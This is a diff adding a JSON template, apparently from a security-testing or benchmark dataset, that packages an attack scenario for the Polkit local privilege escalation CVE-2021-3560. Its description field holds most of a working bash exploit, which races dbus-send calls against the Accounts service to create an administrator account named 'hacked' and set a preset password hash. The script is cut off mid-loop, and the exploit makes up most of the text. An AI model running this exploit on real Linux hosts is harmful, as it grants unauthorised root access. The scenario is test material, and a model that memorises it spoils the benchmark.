@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_50011",
+  "category": "A4_polkit",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Polkit 0.105-26 0.117-2 - Local Privilege Escalation (CVE-2021-3560)\n\nExploit source code (50011.sh):\n```\n# Exploit Title: Polkit 0.105-26 0.117-2 - Local Privilege Escalation\n# Date: 06/11/2021\n# Exploit Author: J Smith (CadmusofThebes)\n# Vendor Homepage: https://www.freedesktop.org/\n# Software Link: https://www.freedesktop.org/software/polkit/docs/latest/polkitd.8.html\n# Version: polkit 0.105-26 (Ubuntu), polkit 0.117-2 (Fedora)\n# Tested on: Ubuntu 20.04, Fedora 33\n# CVE: CVE-2021-3560\n# Source: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\n\n#!/bin/bash\n\n# Set the name and display name\nuserName=\"hacked\"\nrealName=\"hacked\"\n\n# Set the account as an administrator\naccountType=1\n\n# Set the password hash for 'password' and password hint\npassword='$5$WR3c6uwMGQZ/JEZw$OlBVzagNJswkWrKRSuoh/VCrZv183QpZL7sAeskcoTB'\npassHint=\"password\"\n\n# Check Polkit version\npolkitVersion=$(systemctl status polkit.service | grep version | cut -d \" \" -f 9)\nif [[ \"$(apt list --installed 2>/dev/null | grep polkit | grep -c 0.105-26)\" -ge 1 || \"$(yum list installed | grep polkit | grep -c 0.117-2)\" ]]; then\n    echo \"[*] Vulnerable version of polkit found\"\nelse\n    echo \"[!] WARNING: Version of polkit might not vulnerable\"\nfi\n\n# Validate user is running in SSH instead of desktop terminal\nif [[ -z $SSH_CLIENT || -z $SSH_TTY ]]; then\n    echo \"[!] WARNING: SSH into localhost first before running this script in order to avoid authentication prompts\"\n    exit\nfi\n\n# Test the dbus-send timing to load into exploit\necho \"[*] Determining dbus-send timing\"\nrealTime=$( TIMEFORMAT=\"%R\"; { time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType ; } 2>&1 | cut -d \" \" -f6 )\nhalfTime=$(echo \"scale=3;$realTime/2\" | bc)\n\n# Check for user first in case previous run of script failed on password set\nif id \"$userName\" &>/dev/null; then\n    userid=$(id -u $userName)\n    echo \"[*] New user $userName already exists with uid of $userid\"\nelse\n    userid=\"\"\n\techo \"[*] Attempting to create account\"\n    while [[ $userid == \"\" ]]\n    do\n        dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2>/dev/null & sleep $halfTime ; kill $! 2>/dev/null\n        if id \"$userName\" &>/dev/null; then\n\t    userid=$(id -u $userName)\n            echo \"[*] New user $userName created with uid of $userid\"\n        fi\n    done\nfi\n\n# Add the password to /etc/shadow\n# Sleep added to ensure there is enough of a delay between timestamp checks\necho \"[*] Adding password to /etc/shadow and enabling user\"\nsleep 1\ncurrentTimestamp=$(stat -c %Z /etc/shadow)\nfileChanged=\"n\"\nwhile [ $fileChanged == \"n\" ]\ndo\n    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2>/dev/nul\n```",
+  "cve": "CVE-2021-3560",
+  "exploitdb_id": "50011",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_50011",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
